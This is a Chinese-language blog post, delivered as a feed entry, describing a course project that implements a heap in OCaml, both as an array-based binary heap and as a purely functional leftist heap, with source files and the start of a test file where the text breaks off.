        <title><![CDATA[Ocaml Heap]]></title>
        <updated>2021-03-03T07:10:56+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ocaml-heap/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ocaml-heap/"><![CDATA[<h1 id="简介">简介</h1>
<p>本次课设我实现的数据结构是<strong>堆（heap)</strong>，堆是一种非常重要的数据结构，分为大顶堆和小顶堆，可以快速地获取其中优先级最高的元素。若是满足以下特性，即可称为堆：“给定堆中任意节点P和C，若P是C的母节点，那么P的值会小于等于（或大于等于）C的值”。若母节点的值恒小于等于子节点的值，此堆称为最小堆（min heap）；反之，若母节点的值恒大于等于子节点的值，此堆称为最大堆（max heap）。所以堆又称作优先队列。</p>
<h1 id="原理">原理</h1>
<h2 id="完全二叉树">完全二叉树</h2>
<p>堆的实现方式通常是完全二叉树，采用数组进行模拟。完全二叉树的特点是较为对称，查找时时间复杂度较为稳定，可以通过数组进行模拟，而不需要实际构建一棵二叉树。</p>
<p>以数组 <code>[1, 2, 3, 4, 5, 6, 7]</code> 为例，可以构建出如下一棵完全二叉树。</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blogUntitled.png" alt="p1"></p>
<p>对于每个节点都满足值大于父节点，所以这是一个小顶堆。对比数组和二叉树，可以发现：</p>
<ol>
<li>对于节点 <code>i</code> ，它的两个子节点在数组中的索引为 <code>2*i</code> 和 <code>2*i+1</code></li>
<li>两个子节点的大小对于堆的性质并没有影响，这点和二叉搜索树不一样</li>
</ol>
<p>其中的核心操作是 <code>shiftUp</code> 和 <code>shiftDown</code></p>
<p>分析其时间复杂度，有：</p>
<ul>
<li>获取堆顶元素：$O(1)$</li>
<li>插入元素：$O(logn)$</li>
<li>删除元素：$O(logn)$</li>
<li>合并堆：$O(n)$</li>
</ul>
<p>不过采用完全二叉树并不能方便地进行合并操作，需要转换成对一个堆的插入操作</p>
<hr>
<p>但在函数式语言中要如何实现一个堆呢？对于纯函数式语言，是不允许有副作用的。虽然 <code>Ocaml</code> 支持命令式操作，也支持传统的数组，但依然采用数组模拟的话和普通的命令式语言就没有太多区别，而且会产生副作用，这是不推荐的。那么如果用 <code>List</code> 来模拟数组操作呢？</p>
<p><code>Ocaml</code> 中的 <code>List</code> 是通过链表实现的，这就意味着 <code>List</code> 只能进行顺序访问，无法随机访问，也就无法像上面那样构建出一个虚拟的树形结构，而要全部转换成遍历操作。虽然可以通过计算和记录确定节点的位置，但会导致访问的时间复杂性大大提高。还有别的办法吗？</p>
<p>既然用数组模拟完全二叉树的方法在函数式语言中有很大的限制，那我们手动模拟一棵二叉树试试。我们可以定义出以下的数据结构：</p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="k">type</span> <span class="k">&#39;</span><span class="n">a</span> <span class="n">heap</span> <span class="o">=</span> 
	<span class="o">|</span> <span class="nc">Leaf</span>
	<span class="o">|</span> <span class="nc">Node</span> <span class="k">of</span> <span class="k">&#39;</span><span class="n">a</span> <span class="o">*</span> <span class="k">&#39;</span><span class="n">a</span> <span class="n">heap</span> <span class="o">*</span> <span class="k">&#39;</span><span class="n">a</span> <span class="n">heap</span>
</code></pre></div><p>该结构参考了书上的内容，一个节点由自身的值和左右子节点构成，空节点为叶子节点。</p>
<p>对于插入操作，传统的数组模拟方式将元素插入数组尾部，再调用 <code>shiftUp</code> 操作将元素移动到正确的位置，如图所示：</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757139001-Untitled%201.png" alt="p2"></p>
<p>但在树状结构中，我们很难找到最后一个元素的位置，或者说时间复杂度太高，不具备可行性，也就无法采用 <code>shiftUp</code> 的思想。而我们的树结构只保存了根节点的位置，也就意味着只能自顶向下想想办法。</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757187865-Untitled%202.png" alt="p3"></p>
<p>首先比较 1 和 4 ，1 比 4 小，应该继续向下，但应该走左边还是右边呢？堆能保持高效性的原因之一就是结构比较对称，即左右子树的深度大致相等。必须要找到一个规则来解决这个问题。</p>
<p>堆的另一个重要操作是删除，即删除最顶端节点。这时我们发现如果删掉了根节点，我们会得到两个二叉树：</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757208893-Untitled%203.png" alt="p4"></p>
<p>在数组模拟的方式中我们将数组的最后一个元素（也就是完全二叉树的最后一个节点）移动到原本根节点的为止，再采用 <code>shiftDown</code> 操作将它移动到正确的位置。但同上面的问题一样，无法快速定位到最后一个节点，因此问题变成了如何合并两个堆。这时再看插入操作，发现也可以当成合并堆解决，即将目标堆和由待插入元素构成的只有一个节点的堆进行合并。可见堆的核心操作都转换成了堆合并，这就需要找到一个可以高效地进行堆合并的方法。</p>
<h2 id="左偏树">左偏树</h2>
<p>搜索后发现，虽然大部分算法教程和书中堆都是采用数组模拟完全二叉树，但也有其它数据结构可以实现堆，就是左偏树。查看维基百科中的定义：</p>
<blockquote>
<p>左偏树是一种可并堆的实现。左偏树是一棵二叉树，它的节点除了和二叉树的节点一样具有左右子树指针（left, right）外，还有两个属性： 键值和距离（英文文献中称为s-value）。键值用于比较节点的大小。距离的定义如下：
当且仅当节点 i 的左子树或右子树为空时，节点被称作外节点（实际上保存在二叉树中的节点都是内节点，外节点是逻辑上存在而无需保存。把一颗二叉树补上全部的外节点，则称为extended binary tree）。节点i的距离是节点 i 到它的后代中的最近的外节点所经过的边数。特别的，如果节点 i 本身是外节点，则它的距离为0;而空节点的距离规定为 -1。</p>
</blockquote>
<p>光看定义比较复杂，但其实很简单，只需要在上面定义的树中加入一个距离（rank）即可，一个节点距离的值为到最右叶子节点的长度，如图所示：</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757222212-Untitled%204.png" alt="p5"></p>
<p>rank 是用来比较左右子树的长度的，在左偏树中，<strong>所有节点的左子树 rank 值一定大于等于右子树</strong>。因此每次进行合并操作时我们选择右子树，重复进行直到叶子节点或正确的位置，最后更新路径上的 rank 值，如果出现右子树的 rank 值大于左子树，则交换左右子树以保证左偏树的定义成立。</p>
<p>作为左偏树的核心操作，合并（merge）操作的流程如下：</p>
<ol>
<li>合并 <code>t1</code> ，<code>t2</code> 两个树 <code>merge t1 t2</code></li>
<li>比较两个树根节点的值，如果 <code>v1 &lt; v2</code> 则交换两个树（即 <code>merge t2 t1</code> ），这样做的目的是保证左边树的值小于右边，便于操作。实际比较操作是通过函子中的 <code>compare</code> 函数进行，可以根据该函数设置大顶堆或小顶堆</li>
<li>由于左边树（ <code>t1</code> ）根节点的值小于右边树（ <code>t2</code> ），<code>v1</code> 保持不变作为新的根节点</li>
<li>由于 <code>t1</code> 的右子树 <code>r</code> 一定是最短的，开始合并 <code>r</code> 和 <code>t2</code> （即 <code>merge r t2</code> ）</li>
<li>当任一子树是叶子节点时，只需要直接返回另一个子树，并开始向上更新每个节点的 <code>rank</code> 值</li>
<li>更新完毕后还要比较左右子树的 <code>rank</code> 值以确定是否需要交换左右子树</li>
</ol>
<p>看一个合并子树的例子：</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/blog/1614757235831-Untitled%205.png" alt="p6"></p>
<p>分析其时间复杂度，有：</p>
<ul>
<li>获取堆顶元素：$O(1)$</li>
<li>插入元素：$O(logn)$</li>
<li>删除元素：$O(logn)$</li>
<li>合并堆：$O(logn)$</li>
</ul>
<h1 id="代码">代码</h1>
<h2 id="完全二叉树-1">完全二叉树</h2>
<p>这部分代码是我一开始研究学习时写的测试代码，比较混乱，也采用了很多命令式语言的思维，比如有大量的副作用，对对象的操作都是在一个对象本身等。这里保留在这来和下面纯函数式的写法做一个对比</p>
<p><code>binary_heap.ml</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">=</span> <span class="k">struct</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="k">type</span> <span class="n">tree</span> <span class="o">=</span> <span class="o">{</span> <span class="k">mutable</span> <span class="n">elements</span> <span class="o">:</span> <span class="n">elt</span> <span class="kt">array</span><span class="o">;</span> <span class="k">mutable</span> <span class="n">size</span> <span class="o">:</span> <span class="kt">int</span> <span class="o">}</span>

  <span class="k">let</span> <span class="n">create</span> <span class="n">n</span> <span class="n">default</span> <span class="o">=</span> <span class="o">{</span> <span class="n">size</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">elements</span> <span class="o">=</span> <span class="nn">Array</span><span class="p">.</span><span class="n">make</span> <span class="n">n</span> <span class="n">default</span> <span class="o">}</span>

  <span class="k">let</span> <span class="n">insert</span> <span class="n">v</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">let</span> <span class="n">d</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">elements</span> <span class="k">in</span>
    <span class="k">let</span> <span class="k">rec</span> <span class="n">shiftUp</span> <span class="n">i</span> <span class="o">=</span>
      <span class="k">let</span> <span class="n">fi</span> <span class="o">=</span> <span class="o">(</span><span class="n">i</span> <span class="o">-</span> <span class="n">1</span><span class="o">)</span> <span class="o">/</span> <span class="n">2</span> <span class="k">in</span>
      <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="o">&amp;&amp;</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">d</span><span class="o">.(</span><span class="n">fi</span><span class="o">)</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="k">then</span> <span class="o">(</span>
        <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">d</span><span class="o">.(</span><span class="n">fi</span><span class="o">);</span>
        <span class="n">shiftUp</span> <span class="n">fi</span> <span class="o">)</span>
      <span class="k">else</span> <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">v</span>
    <span class="k">in</span>
    <span class="n">shiftUp</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span><span class="o">;</span>
    <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;-</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">1</span>

  <span class="k">let</span> <span class="n">deleteTop</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="k">then</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span>
    <span class="k">else</span>
      <span class="k">let</span> <span class="n">n</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">-</span> <span class="n">1</span> <span class="k">in</span>
      <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;-</span> <span class="n">n</span><span class="o">;</span>
      <span class="k">let</span> <span class="n">d</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">elements</span> <span class="k">in</span>
      <span class="k">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">d</span><span class="o">.(</span><span class="n">n</span><span class="o">)</span> <span class="k">in</span>
      <span class="k">let</span> <span class="k">rec</span> <span class="n">shiftDown</span> <span class="n">i</span> <span class="o">=</span>
        <span class="k">let</span> <span class="n">ci</span> <span class="o">=</span> <span class="o">(</span><span class="n">2</span> <span class="o">*</span> <span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span> <span class="k">in</span>
        <span class="k">if</span> <span class="n">ci</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="k">then</span>
          <span class="k">let</span> <span class="n">j</span> <span class="o">=</span>
            <span class="k">let</span> <span class="n">k</span> <span class="o">=</span> <span class="n">ci</span> <span class="o">+</span> <span class="n">1</span> <span class="k">in</span>
            <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="o">&amp;&amp;</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">d</span><span class="o">.(</span><span class="n">k</span><span class="o">)</span> <span class="n">d</span><span class="o">.(</span><span class="n">ci</span><span class="o">)</span> <span class="o">&lt;</span> <span class="n">0</span> <span class="k">then</span> <span class="n">k</span> <span class="k">else</span> <span class="n">ci</span>
          <span class="k">in</span>
          <span class="k">if</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">d</span><span class="o">.(</span><span class="n">j</span><span class="o">)</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">0</span> <span class="k">then</span> <span class="o">(</span>
            <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">d</span><span class="o">.(</span><span class="n">j</span><span class="o">);</span>
            <span class="n">shiftDown</span> <span class="n">j</span> <span class="o">)</span>
          <span class="k">else</span> <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">x</span>
        <span class="k">else</span> <span class="n">d</span><span class="o">.(</span><span class="n">i</span><span class="o">)</span> <span class="o">&lt;-</span> <span class="n">x</span>
      <span class="k">in</span>
      <span class="n">shiftDown</span> <span class="n">0</span>

  <span class="k">let</span> <span class="n">getTop</span> <span class="n">t</span> <span class="o">=</span> <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="k">then</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span> <span class="k">else</span> <span class="n">t</span><span class="o">.</span><span class="n">elements</span><span class="o">.(</span><span class="n">0</span><span class="o">)</span>

  <span class="k">let</span> <span class="k">rec</span> <span class="n">toList</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="k">then</span> <span class="bp">[]</span>
    <span class="k">else</span>
      <span class="k">let</span> <span class="n">top</span> <span class="o">=</span> <span class="n">getTop</span> <span class="n">t</span> <span class="k">in</span>
      <span class="n">deleteTop</span> <span class="n">t</span><span class="o">;</span>
      <span class="n">top</span> <span class="o">::</span> <span class="n">toList</span> <span class="n">t</span>

  <span class="k">let</span> <span class="k">rec</span> <span class="n">fromList</span> <span class="n">n</span> <span class="n">default</span> <span class="o">=</span> <span class="k">function</span>
    <span class="o">|</span> <span class="bp">[]</span> <span class="o">-&gt;</span> <span class="n">create</span> <span class="n">n</span> <span class="n">default</span>
    <span class="o">|</span> <span class="n">hd</span> <span class="o">::</span> <span class="n">tl</span> <span class="o">-&gt;</span>
        <span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="n">fromList</span> <span class="n">n</span> <span class="n">default</span> <span class="n">tl</span> <span class="k">in</span>
        <span class="n">insert</span> <span class="n">hd</span> <span class="n">t</span><span class="o">;</span>
        <span class="n">t</span>
<span class="k">end</span>
</code></pre></div><p><code>binary_heap.mli</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">:</span> <span class="k">functor</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="k">sig</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="k">type</span> <span class="n">tree</span>

  <span class="c">(* create an empty heap, with only a leaf *)</span>
  <span class="k">val</span> <span class="n">create</span> <span class="o">:</span> <span class="kt">int</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* insert an element into a heap, just like merge two heap *)</span>
  <span class="k">val</span> <span class="n">insert</span> <span class="o">:</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="kt">unit</span>

  <span class="c">(* delete the top element of a heap, just merge two children trees *)</span>
  <span class="k">val</span> <span class="n">deleteTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="kt">unit</span>

  <span class="c">(* get the top element of a heap *)</span>
  <span class="k">val</span> <span class="n">getTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span>

  <span class="c">(* generate a list from a heap *)</span>
  <span class="k">val</span> <span class="n">toList</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="kt">list</span>

  <span class="c">(* create a heap from list *)</span>
  <span class="k">val</span> <span class="n">fromList</span> <span class="o">:</span> <span class="kt">int</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="kt">list</span> <span class="o">-&gt;</span> <span class="n">tree</span>
<span class="k">end</span>
</code></pre></div><h2 id="左偏堆">左偏堆</h2>
<p>这里的左偏堆采用了纯函数式的写法，包括采用联合体构建一棵二叉树，所有操作都无副作用，返回一个新的对象等。和上面命令式的写法相比，也更加简练，通过递归和迭代就实现了复杂的操作逻辑</p>
<p><code>heap.ml</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">=</span> <span class="k">struct</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="c">(* heaps are represented by leftist tree *)</span>
  <span class="k">type</span> <span class="n">tree</span> <span class="o">=</span>
    <span class="c">(* leaf node *)</span>
    <span class="o">|</span> <span class="nc">Leaf</span>
    <span class="c">(* left child, value of node, right child, rank of node *)</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="k">of</span> <span class="n">tree</span> <span class="o">*</span> <span class="n">elt</span> <span class="o">*</span> <span class="n">tree</span> <span class="o">*</span> <span class="kt">int</span>

  <span class="c">(* create an empty heap, with only a leaf *)</span>
  <span class="k">let</span> <span class="n">create</span> <span class="bp">()</span> <span class="o">=</span> <span class="nc">Leaf</span>

  <span class="c">(* create a node contains only v *)</span>
  <span class="k">let</span> <span class="n">singleton</span> <span class="n">v</span> <span class="o">=</span> <span class="nc">Node</span> <span class="o">(</span><span class="nc">Leaf</span><span class="o">,</span> <span class="n">v</span><span class="o">,</span> <span class="nc">Leaf</span><span class="o">,</span> <span class="n">1</span><span class="o">)</span>

  <span class="c">(* get the rank of a node *)</span>
  <span class="k">let</span> <span class="n">getRank</span> <span class="o">=</span> <span class="k">function</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">0</span> <span class="o">|</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="o">_,</span> <span class="o">_,</span> <span class="n">r</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="n">r</span>

  <span class="c">(* merge to heap, the most important function in leftist heap *)</span>
  <span class="k">let</span> <span class="k">rec</span> <span class="n">merge</span> <span class="n">t1</span> <span class="n">t2</span> <span class="o">=</span>
    <span class="k">match</span> <span class="o">(</span><span class="n">t1</span><span class="o">,</span> <span class="n">t2</span><span class="o">)</span> <span class="k">with</span>
    <span class="o">|</span> <span class="nc">Leaf</span><span class="o">,</span> <span class="n">t</span> <span class="o">|</span> <span class="n">t</span><span class="o">,</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">t</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">l</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">r</span><span class="o">,</span> <span class="o">_),</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="n">v2</span><span class="o">,</span> <span class="o">_,</span> <span class="o">_)</span> <span class="o">-&gt;</span>
        <span class="c">(* switch two heap if the tree on the left have a bigger key *)</span>
        <span class="k">if</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">compare</span> <span class="n">v1</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="k">then</span> <span class="n">merge</span> <span class="n">t2</span> <span class="n">t1</span>
          <span class="c">(* the order is determined by the compare function *)</span>
        <span class="k">else</span>
          <span class="c">(* merge with the right tree *)</span>
          <span class="k">let</span> <span class="n">merged</span> <span class="o">=</span> <span class="n">merge</span> <span class="n">r</span> <span class="n">t2</span> <span class="k">in</span>
          <span class="k">let</span> <span class="n">leftRank</span> <span class="o">=</span> <span class="n">getRank</span> <span class="n">l</span> <span class="ow">and</span> <span class="n">rightRank</span> <span class="o">=</span> <span class="n">getRank</span> <span class="n">merged</span> <span class="k">in</span>
          <span class="c">(* compare the rank of both tree *)</span>
          <span class="k">if</span> <span class="n">leftRank</span> <span class="o">&gt;=</span> <span class="n">rightRank</span> <span class="k">then</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">l</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">merged</span><span class="o">,</span> <span class="n">rightRank</span> <span class="o">+</span> <span class="n">1</span><span class="o">)</span>
            <span class="c">(* switch left and right since left tree is shorter *)</span>
          <span class="k">else</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">merged</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="n">l</span><span class="o">,</span> <span class="n">leftRank</span> <span class="o">+</span> <span class="n">1</span><span class="o">)</span>

  <span class="c">(* insert an element into a heap, just like merge two heap *)</span>
  <span class="k">let</span> <span class="n">insert</span> <span class="n">v</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">match</span> <span class="n">t</span> <span class="k">with</span>
    <span class="o">|</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">singleton</span> <span class="n">v</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="o">_,</span> <span class="o">_,</span> <span class="o">_)</span> <span class="o">-&gt;</span> <span class="n">merge</span> <span class="n">t</span> <span class="o">(</span><span class="n">singleton</span> <span class="n">v</span><span class="o">)</span>

  <span class="c">(* get the top element of a heap *)</span>
  <span class="k">let</span> <span class="n">getTop</span> <span class="o">=</span> <span class="k">function</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span> <span class="o">|</span> <span class="nc">Node</span> <span class="o">(_,</span> <span class="n">v</span><span class="o">,</span> <span class="o">_,</span> <span class="o">_)</span> <span class="o">-&gt;</span> <span class="n">v</span>

  <span class="c">(* delete the top element of a heap, just merge two children trees *)</span>
  <span class="k">let</span> <span class="n">deleteTop</span> <span class="o">=</span> <span class="k">function</span>
    <span class="o">|</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="n">failwith</span> <span class="s2">&#34;empty&#34;</span>
    <span class="o">|</span> <span class="nc">Node</span> <span class="o">(</span><span class="n">l</span><span class="o">,</span> <span class="o">_,</span> <span class="n">r</span><span class="o">,</span> <span class="o">_)</span> <span class="o">-&gt;</span> <span class="n">merge</span> <span class="n">l</span> <span class="n">r</span>

  <span class="c">(* generate a list from a heap *)</span>
  <span class="k">let</span> <span class="k">rec</span> <span class="n">toList</span> <span class="n">t</span> <span class="o">=</span>
    <span class="k">match</span> <span class="n">t</span> <span class="k">with</span> <span class="nc">Leaf</span> <span class="o">-&gt;</span> <span class="bp">[]</span> <span class="o">|</span> <span class="o">_</span> <span class="o">-&gt;</span> <span class="n">getTop</span> <span class="n">t</span> <span class="o">::</span> <span class="n">toList</span> <span class="o">(</span><span class="n">deleteTop</span> <span class="n">t</span><span class="o">)</span>

  <span class="k">let</span> <span class="k">rec</span> <span class="n">fromList</span> <span class="o">=</span> <span class="k">function</span>
    <span class="o">|</span> <span class="bp">[]</span> <span class="o">-&gt;</span> <span class="n">create</span> <span class="bp">()</span>
    <span class="o">|</span> <span class="n">hd</span> <span class="o">::</span> <span class="n">tl</span> <span class="o">-&gt;</span> <span class="n">insert</span> <span class="n">hd</span> <span class="o">(</span><span class="n">fromList</span> <span class="n">tl</span><span class="o">)</span>
<span class="k">end</span>
</code></pre></div><p><code>heap.mli</code></p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* Input signature of the functor *)</span>
<span class="k">module</span> <span class="k">type</span> <span class="nc">OrderedType</span> <span class="o">=</span> <span class="k">sig</span>
  <span class="c">(* the type of the heap elements *)</span>
  <span class="k">type</span> <span class="n">t</span>

  <span class="c">(* compare function used to determine the order of elements *)</span>
  <span class="k">val</span> <span class="n">compare</span> <span class="o">:</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="n">t</span> <span class="o">-&gt;</span> <span class="kt">int</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nc">Make</span> <span class="o">:</span> <span class="k">functor</span> <span class="o">(</span><span class="nc">Ord</span> <span class="o">:</span> <span class="nc">OrderedType</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="k">sig</span>
  <span class="k">type</span> <span class="n">elt</span> <span class="o">=</span> <span class="nn">Ord</span><span class="p">.</span><span class="n">t</span>

  <span class="k">type</span> <span class="n">tree</span>

  <span class="c">(* create an empty heap, with only a leaf *)</span>
  <span class="k">val</span> <span class="n">create</span> <span class="o">:</span> <span class="kt">unit</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* merge to heap, the most important function in leftist heap *)</span>
  <span class="k">val</span> <span class="n">merge</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* insert an element into a heap, just like merge two heap *)</span>
  <span class="k">val</span> <span class="n">insert</span> <span class="o">:</span> <span class="n">elt</span> <span class="o">-&gt;</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* get the top element of a heap *)</span>
  <span class="k">val</span> <span class="n">getTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span>

  <span class="c">(* delete the top element of a heap, just merge two children trees *)</span>
  <span class="k">val</span> <span class="n">deleteTop</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">tree</span>

  <span class="c">(* generate a list from a heap *)</span>
  <span class="k">val</span> <span class="n">toList</span> <span class="o">:</span> <span class="n">tree</span> <span class="o">-&gt;</span> <span class="n">elt</span> <span class="kt">list</span>

  <span class="c">(* create a heap from list *)</span>
  <span class="k">val</span> <span class="n">fromList</span> <span class="o">:</span> <span class="n">elt</span> <span class="kt">list</span> <span class="o">-&gt;</span> <span class="n">tree</span>
<span class="k">end</span>
</code></pre></div><p><code>test.ml</code></p>
<p>测试文件，对所写的堆向外提供的函数进行测试。创建了一个带 <code>int</code> 类型的函子，采用自定义的排序函数实现大顶堆。还创建了一个 <code>String</code> 类型的函子</p>
<div class="highlight"><pre class="chroma"><code class="language-ocaml" data-lang="ocaml"><span class="c">(* int 型函子，带比较函数 *)</span>
<span class="k">module</span> <span class="nc">E</span> <span class="o">=</span> <span class="k">struct</span>
  <span class="k">type</span> <span class="n">t</span> <span class="o">=</span> <span class="kt">int</span>

  <span class="k">let</span> <span class="n">compare</span> <span class="n">a</span> <span class="n">b</span> <span class="o">=</span> <span class="o">-</span><span class="n">compare</span> <span class="n">a</span> <span class="n">b</span>
<span class="k">end</span>

<span class="c">(* int 型大顶堆，采用左偏树 *)</span>
<span class="k">module</span> <span class="nc">H_int</span> <span class="o">=</span> <span class="nn">Heap</span><span class="p">.</span><span class="nc">Make</span> <span class="o">(</span><span class="nc">E</span><span class="o">)</span>

<span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">create</span> <span class="bp">()</span>

<span class="c">(* 测试基本的插入、删除等操作 *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span>
